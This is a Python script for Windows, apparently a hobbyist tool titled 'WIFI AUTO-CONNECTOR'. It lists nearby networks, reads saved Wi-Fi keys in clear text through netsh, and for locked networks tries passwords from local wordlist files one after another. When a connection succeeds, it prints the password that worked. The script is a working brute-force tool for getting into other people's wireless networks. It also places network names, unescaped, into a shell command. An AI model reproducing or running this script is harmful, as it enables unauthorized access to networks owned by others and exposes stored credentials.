import subprocess
import platform
import sys
import os
import ctypes
import time
import requests

# کدهای رنگ برای ترمینال
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

def typing_animation(text, color=Colors.WHITE, delay=0.01):
    """انیمیشن تایپ سریع با رنگ"""
    print(color + Colors.BOLD, end='', flush=True)
    for char in text:
        print(char, end='', flush=True)
        time.sleep(delay)
    print(Colors.END, end='', flush=True)
    print()

def show_banner():
    """نمایش بنر رنگی"""
    os.system('cls' if os.name == 'nt' else 'clear')
    typing_animation("═" * 60, Colors.CYAN, 0.02)
    typing_animation("🚀 WIFI AUTO-CONNECTOR", Colors.PURPLE, 0.03)
    typing_animation("Made by Erfanminemaster", Colors.YELLOW, 0.02)
    typing_animation("═" * 60, Colors.CYAN, 0.02)
    time.sleep(1)
    print()

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def check_location_services():
    try:
        result = subprocess.run(['netsh', 'wlan', 'show', 'networks'], 
                              capture_output=True, text=True, encoding='utf-8', errors='ignore', timeout=5)
        return not ("location permission" in result.stdout.lower() or "access is denied" in result.stdout.lower())
    except:
        return False

def get_saved_wifi_password(ssid):
    try:
        command = f'netsh wlan show profile name="{ssid}" key=clear'
        result = subprocess.run(command, capture_output=True, text=True, shell=True, encoding='utf-8', errors='ignore')
        
        if result.returncode == 0:
            for line in result.stdout.split('\n'):
                if 'Key Content' in line:
                    parts = line.split(':')
                    if len(parts) > 1:
                        return parts[1].strip()
        return None
    except:
        return None

def get_all_available_networks():
    typing_animation("📡 Scanning for WiFi networks...", Colors.BLUE)
    available_networks = []
    
    try:
        result = subprocess.run(['netsh', 'wlan', 'show', 'networks'], 
                              capture_output=True, text=True, encoding='utf-8', errors='ignore', timeout=15)
        
        if result.returncode == 0:
            current_ssid = None
            current_auth = None
            
            for line in result.stdout.split('\n'):
                line = line.strip()
                
                # پیدا کردن SSID
                if 'SSID' in line and 'BSSID' not in line and 'Number' not in line:
                    parts = line.split(':', 1)
                    if len(parts) > 1:
                        current_ssid = parts[1].strip()
                
                # پیدا کردن نوع Authentication
                elif 'Authentication' in line:
                    parts = line.split(':', 1)
                    if len(parts) > 1:
                        current_auth = parts[1].strip()
                
                # وقتی به انتهای اطلاعات یک شبکه رسیدیم
                elif line == '' and current_ssid:
                    # تشخیص نوع شبکه
                    is_open_network = False
                    has_saved_password = False
                    saved_password = None
                    
                    # اگر Authentication Open باشد
                    if current_auth and 'Open' in current_auth:
                        is_open_network = True
                    else:
                        # چک کردن آیا رمز ذخیره شده داریم
                        saved_password = get_saved_wifi_password(current_ssid)
                        has_saved_password = bool(saved_password and "not found" not in saved_password.lower())
                    
                    network_info = {
                        'ssid': current_ssid,
                        'is_open_network': is_open_network,
                        'has_saved_password': has_saved_password,
                        'password': saved_password if has_saved_password else None,
                        'authentication': current_auth
                    }
                    available_networks.append(network_info)
                    
                    # ریست کردن برای شبکه بعدی
                    current_ssid = None
                    current_auth = None
        
        return available_networks
        
    except Exception as e:
        print(f"Error: {e}")
        return []

def read_passwords_from_files():
    passwords = []
    folder_path = os.path.join(os.path.dirname(__file__), "pass")
    
    if not os.path.exists(folder_path):
        return passwords
    
    for i in range(1, 4):
        file_path = os.path.join(folder_path, f"{i}.txt")
        if os.path.exists(file_path):
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    for line in f:
                        password = line.strip()
                        if password:
                            passwords.append(password)
            except:
                pass
    
    typing_animation(f"✅ Loaded {len(passwords)} passwords", Colors.GREEN)
    return passwords

def quick_internet_check():
    try:
        result = subprocess.run(['ping', '-n', '1', '8.8.8.8'], 
                              capture_output=True, timeout=3)
        return result.returncode == 0
    except:
        return False

def quick_connection_check(ssid):
    try:
        time.sleep(2)
        
        result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], 
                              capture_output=True, text=True, encoding='utf-8', timeout=5)
        
        if result.returncode == 0:
            if ssid in result.stdout and 'Connected' in result.stdout:
                return quick_internet_check()
        return False
        
    except:
        return False

def fast_connect_to_wifi(ssid, password):
    try:
        if not password:
            return False, None
            
        xml_content = f'''<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{ssid}</name>
    <SSIDConfig><SSID><name>{ssid}</name></SSID></SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{password}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>'''
        
        temp_path = f"temp_{ssid}.xml"
        with open(temp_path, 'w', encoding='utf-8') as f:
            f.write(xml_content)
        
        subprocess.run(['netsh', 'wlan', 'add', 'profile', f'filename={temp_path}'], 
                     capture_output=True, timeout=3)
        connect_result = subprocess.run(['netsh', 'wlan', 'connect', f'name={ssid}'], 
                                      capture_output=True, timeout=5)
        
        try:
            os.remove(temp_path)
        except:
            pass
        
        if connect_result.returncode == 0:
            return quick_connection_check(ssid), password
        return False, None
            
    except:
        return False, None

def connect_to_open_network(ssid):
    try:
        # برای شبکه‌های باز نیازی به پروفایل امنیتی نیست
        connect_result = subprocess.run(['netsh', 'wlan', 'connect', f'name={ssid}'], 
                                      capture_output=True, timeout=10)
        
        if connect_result.returncode == 0:
            return quick_connection_check(ssid)
        return False
        
    except:
        return False

def ultra_fast_auto_connect(ssid, password_list):
    typing_animation(f"\n🚀 Ultra-Fast Auto-Connect to: {ssid}", Colors.PURPLE)
    typing_animation(f"📊 Testing {len(password_list):,} passwords...", Colors.BLUE)
    typing_animation("⚡ Speeding up process...\n", Colors.CYAN)
    
    start_time = time.time()
    batch_size = 25
    tested = 0
    
    for i, password in enumerate(password_list, 1):
        tested = i
        
        if i % batch_size == 0 or i <= 10:
            elapsed = time.time() - start_time
            speed = i / elapsed if elapsed > 0 else 0
            remaining = len(password_list) - i
            eta = remaining / speed if speed > 0 else 0
            typing_animation(f"🔍 {i:,}/{len(password_list):,} - {speed:.1f} pwd/sec - ETA: {eta:.1f}s", Colors.CYAN)
        
        success, used_password = fast_connect_to_wifi(ssid, password)
        if success:
            elapsed = time.time() - start_time
            typing_animation(f"\n" + "="*60, Colors.GREEN)
            typing_animation(f"🎉 SUCCESS! Password: {used_password}", Colors.GREEN)
            typing_animation(f"📶 Connected to: {ssid}", Colors.GREEN)
            typing_animation(f"🌐 Internet: CONFIRMED", Colors.GREEN)
            typing_animation(f"⚡ Tested {i:,} passwords in {elapsed:.1f}s", Colors.GREEN)
            typing_animation("="*60, Colors.GREEN)
            return True, used_password
        
        if i % 100 == 0:
            time.sleep(0.5)
    
    elapsed = time.time() - start_time
    typing_animation(f"\n❌ Tested {tested:,} passwords - No match found", Colors.RED)
    return False, None

def main():
    show_banner()
    typing_animation("🚀 WiFi Auto-Connector", Colors.PURPLE)
    typing_animation("=" * 40, Colors.CYAN)
    
    if not is_admin():
        typing_animation("❌ Run as Administrator!", Colors.RED)
        return
    
    if not check_location_services():
        typing_animation("❌ Enable Location services!", Colors.RED)
        return
    
    networks = get_all_available_networks()
    
    if not networks:
        typing_animation("❌ No networks found!", Colors.RED)
        return
    
    typing_animation(f"\n📶 Found {len(networks)} networks:", Colors.BLUE)
    typing_animation("-" * 40, Colors.CYAN)
    
    for i, net in enumerate(networks, 1):
        if net['is_open_network']:
            status = "🔓 OPEN"
            color = Colors.GREEN
        elif net['has_saved_password']:
            status = "🔐 SAVED"
            color = Colors.YELLOW
        else:
            status = "🔒 LOCKED"
            color = Colors.RED
        
        typing_animation(f"{i}. {net['ssid']} {status}", color)
    
    typing_animation("-" * 40, Colors.CYAN)
    choice = input(Colors.WHITE + "Connect? (yes/no): " + Colors.END).lower()
    
    if choice in ['yes', 'y', '1']:
        target = input(Colors.WHITE + "Enter network name: " + Colors.END).strip()
        
        selected = None
        for net in networks:
            if net['ssid'] == target:
                selected = net
                break
        
        if selected:
            typing_animation(f"\n🔌 Connecting to: {selected['ssid']}", Colors.BLUE)
            
            if selected['is_open_network']:
                # وای‌فای بدون رمز
                typing_animation("🔓 Open network - No password needed", Colors.GREEN)
                if connect_to_open_network(selected['ssid']):
                    typing_animation("✅ Connected!", Colors.GREEN)
                else:
                    typing_animation("❌ Failed to connect!", Colors.RED)
                    
            elif selected['has_saved_password']:
                # وای‌فای با رمز ذخیره شده
                typing_animation(f"🔑 Using saved password", Colors.YELLOW)
                success, used_password = fast_connect_to_wifi(selected['ssid'], selected['password'])
                if success:
                    typing_animation(f"✅ Connected! pass: {used_password}", Colors.GREEN)
                else:
                    typing_animation("❌ Failed!", Colors.RED)
            else:
                # وای‌فای با رمز اما بدون پسورد ذخیره شده
                typing_animation("🔒 Locked network - Need password", Colors.RED)
                mode = input(Colors.WHITE + "Auto (a) or Manual (m): " + Colors.END).lower()
                
                if mode in ['a', 'auto']:
                    passwords = read_passwords_from_files()
                    if passwords:
                        success, found_pass = ultra_fast_auto_connect(selected['ssid'], passwords)
                        if success:
                            typing_animation(f"✅ Connected! pass: {found_pass}", Colors.GREEN)
                        else:
                            typing_animation("❌ No working password found", Colors.RED)
                    else:
                        typing_animation("❌ No password files", Colors.RED)
                
                elif mode in ['m', 'manual']:
                    password = input(Colors.WHITE + "Password: " + Colors.END)
                    success, used_password = fast_connect_to_wifi(selected['ssid'], password)
                    if success:
                        typing_animation(f"✅ Connected! pass: {used_password}", Colors.GREEN)
                    else:
                        typing_animation("❌ Wrong password!", Colors.RED)
        else:
            typing_animation("❌ Network not found!", Colors.RED)
    else:
        typing_animation("👋 Goodbye!", Colors.CYAN)

if __name__ == "__main__":
    main()
